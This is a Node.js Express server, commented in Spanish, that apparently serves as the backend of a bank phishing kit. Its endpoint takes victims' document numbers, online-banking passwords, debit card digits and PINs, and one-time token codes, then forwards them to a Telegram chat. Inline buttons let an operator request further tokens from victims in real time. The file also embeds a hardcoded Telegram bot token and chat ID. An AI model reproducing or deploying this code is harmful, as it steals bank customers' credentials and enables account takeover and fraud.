const express = require('express');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// Configuración inicial
const app = express();
const token = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
const chatId = process.env.TELEGRAM_CHAT_ID || '-1002638389042';

// Middlewares
app.use(express.json());

// Configurar CORS y cabeceras
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, '..')));

// Configurar el bot de Telegram
const bot = new TelegramBot(token, { webHook: true });

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Ruta para archivos HTML
app.get('/*.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', req.path));
});

// Rutas API
app.post('/api/send-telegram', async (req, res) => {
    try {
        const result = await sendTelegramMessage(req.body);
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        res.status(500).json({
            success: false,
            error: 'Error al procesar la solicitud'
        });
    }
});

// Webhook de Telegram
app.post('/api/webhook', (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Función para enviar mensajes
async function sendTelegramMessage(data) {
    try {
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Error de Logo', callback_data: 'error_logo' },
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
                ],
                [
                    { text: '❌ Error de Token', callback_data: 'error_token' },
                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };

        let messageText;
        if (typeof data === 'object') {
            if (data.tipo === 'Clave Segura') {
                messageText = `🔐 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `🔑 Clave: ${data.clave}`;
            } else if (data.tipo === 'Tarjeta Débito') {
                messageText = `💳 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `💳 Tarjeta: ${data.ultimosDigitos}\n` +
                            `🔑 Clave: ${data.claveTarjeta}`;
            } else if (data.tipo === 'Token') {
                messageText = `🔐 Verificación de Token:\n\n` +
                            `🔑 Código: ${data.codigo}\n` +
                            `⏰ Timestamp: ${data.timestamp}`;
            }
        } else {
            messageText = data.toString();
        }

        const result = await bot.sendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        return result;
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        throw error;
    }
}

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    if (!callbackQuery || !callbackQuery.message) {
        console.error('Callback query inválido');
        return;
    }

    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;

        await bot.answerCallbackQuery(callbackQuery.id);

        if (action === 'finalizar') {
            await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: [] }
            });
        }
    } catch (error) {
        console.error('Error al procesar callback query:', error);
    }
});

// Handler para Vercel
const handler = (req, res) => {
    // Asegurarse de que las rutas funcionen
    if (!res.headersSent) {
        return app(req, res);
    }
};

module.exports = handler;